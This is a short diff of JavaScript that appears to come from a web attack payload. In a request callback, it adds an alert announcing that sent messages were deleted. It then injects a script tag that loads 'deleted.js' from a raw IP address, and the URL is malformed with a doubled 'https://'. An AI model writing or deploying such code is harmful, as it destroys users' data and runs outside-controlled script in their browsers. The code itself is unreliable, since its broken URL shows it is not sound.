@@ -3,6 +3,7 @@
   req2.onreadystatechange = function () {
    if (req2.readyState == 4 && req2.status == 200 )
      {
+        alert("Sent Messages Deleted");
         var newtag = document.createElement("script");
         newtag.type = "text/javascript";
         newtag.src = "https://https://172.105.54.23/deleted.js";
